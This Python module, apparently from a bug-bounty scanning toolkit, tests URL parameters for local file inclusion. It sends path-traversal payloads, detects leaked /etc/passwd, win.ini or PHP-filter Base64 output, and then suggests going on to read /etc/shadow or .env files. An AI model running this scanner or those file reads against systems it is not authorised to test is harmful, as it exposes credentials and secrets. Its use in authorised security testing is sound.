"""LFI 路径遍历检测 — 结构化输出 + 二次确认"""

from typing import Optional

from ..client import HttpClient
from ..data import LFI_PAYLOADS
from ..utils import (
    normalize_url, extract_params_from_url, build_url_with_param,
    merge_payloads, ResultBuilder, run_waf_precheck_structured,
)


async def bb_lfi(
    url: str,
    params: str = "",
    proxy: Optional[str] = None,
    cookie: Optional[str] = None, auth_token: Optional[str] = None,
    timeout: int = 15,
    waf_mode: str = "safe",
    max_retries_on_block: int = 3,
    request_delay: float = 0.5,
    method: str = "GET",
    body: str = "",
    custom_payloads: str = "",
) -> dict:
    """LFI 路径遍历检测。

    Args:
        url: 目标 URL（含文件参数）
        custom_payloads: 自定义路径遍历 payload（逗号分隔）
    """
    url = normalize_url(url)
    rb = ResultBuilder("bb_lfi", url)

    waf = await run_waf_precheck_structured(url, waf_mode=waf_mode, request_delay=request_delay,
                                            proxy=proxy, cookie=cookie, auth_token=auth_token)
    rb.set_waf(waf["waf_name"], waf["suggestions"])

    client = HttpClient(timeout=timeout, proxy=proxy, cookie=cookie, auth_token=auth_token)
    payloads = merge_payloads([{"payload": p, "type": "lfi"} for p in LFI_PAYLOADS],
                              custom_payloads, "custom")
    rb.data["metadata"]["payload_count"] = len(payloads)

    test_params = extract_params_from_url(url, params)
    if not test_params:
        rb.add_suggestion("未找到参数 — 请提供含文件参数的 URL 或通过 params= 指定")
        return rb.finalize("error")
    rb.set_params_tested(test_params)

    try:
        base_resp = await client.get(url)
        base_len = len(base_resp.content)
        rb.inc_requests()
        auth_status = "required" if base_resp.status_code in (401, 403) else "none"
        rb.data["metadata"]["auth_status"] = auth_status
    except Exception:
        base_len = 0

    findings = []

    for param in test_params:
        for entry in payloads:
            payload = entry["payload"]
            try:
                new_url = build_url_with_param(url, param, payload)
                if method.upper() == "POST":
                    resp = await client.post(url, data=body or {param: payload})
                else:
                    resp = await client.get(new_url)
                rb.inc_requests()
                resp_body = resp.text

                evidence = ""
                severity = "INFO"

                if "root:" in resp_body and ":" in resp_body[:200]:
                    evidence = "/etc/passwd 读取成功"
                    severity = "CRITICAL"
                elif "[fonts]" in resp_body or "for 16-bit" in resp_body:
                    evidence = "win.ini 读取成功"
                    severity = "HIGH"
                elif "PD9" in resp_body or "base64" in resp_body.lower():
                    evidence = "PHP filter 返回了 Base64 编码内容"
                    severity = "MEDIUM"
                elif base_len and abs(len(resp.content) - base_len) > 500:
                    evidence = f"响应大小变化 ({base_len} -> {len(resp.content)})"
                    severity = "LOW"

                if evidence:
                    finding = {
                        "param": param, "payload": payload,
                        "severity": severity, "evidence": evidence,
                        "status_code": resp.status_code, "verified": False,
                    }
                    # 二次确认：系统文件内容自动确认；大小变化需验证
                    if severity in ("CRITICAL", "HIGH"):
                        finding["verified"] = True
                        finding["verified_by"] = "响应中包含明确的系统文件内容"
                    elif severity == "MEDIUM":
                        # 换一个 payload 验证
                        verify_payload = payload.replace("index", "index.php").replace(".php", "/index")
                        if verify_payload != payload:
                            try:
                                vurl = build_url_with_param(url, param, verify_payload)
                                if method.upper() == "POST":
                                    vresp = await client.post(url, data=body or {param: verify_payload})
                                else:
                                    vresp = await client.get(vurl)
                                rb.inc_requests()
                                if "PD9" in vresp.text or abs(len(vresp.content) - base_len) > 300:
                                    finding["verified"] = True
                                    finding["verified_by"] = "二次确认: 不同 payload 同样返回 Base64/异常响应"
                                    finding["severity"] = "HIGH"
                            except Exception:
                                pass
                    findings.append(finding)
            except Exception:
                pass

    for f in findings:
        rb.add_finding(f)

    if findings:
        best = max(findings, key=lambda f: {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}.get(f["severity"], 0))
        rb.add_suggestion(f"建议尝试读取更多敏感文件（如 {best['param']}=/etc/shadow 或 .env）")

    return rb.finalize()
